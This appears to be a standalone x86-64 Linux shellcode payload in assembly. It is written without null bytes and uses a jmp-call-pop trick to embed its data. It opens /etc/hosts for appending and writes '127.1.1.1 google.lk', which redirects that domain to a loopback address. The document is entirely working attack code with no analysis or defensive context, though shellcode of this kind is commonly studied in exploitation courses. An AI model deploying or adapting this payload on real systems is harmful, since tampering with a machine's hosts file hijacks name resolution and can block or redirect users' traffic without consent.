global _start
    section .text

_start:
    ;open
    ; rdi = *pathname
    ; rsi = 0x0401
    ; rax = 2
    push 2
    pop rax
    xor edi, edi
    push rdi                     ; null byte, terminate string
    push 0x7374736f              ; rax2 -S $(echo osts | rev)
    mov r9, 0x682f6374652f2f2f   ; rax2 -S $(echo ///etc/h | rev)
    push r9
    mov rdi, rsp
    push word 0x0401             ; O_WRONLY|O_APPEND
    pop si
    syscall

    ;write
    mov edi, eax
    xor eax, eax
    inc rax                      ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19                   ; length in rdx
    syscall

    ;close
    sub eax, eax
    add eax, 3
    syscall

    ;exit
    ;xor eax, eax                ; already done by close
    add al, 60
    xor edi, edi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
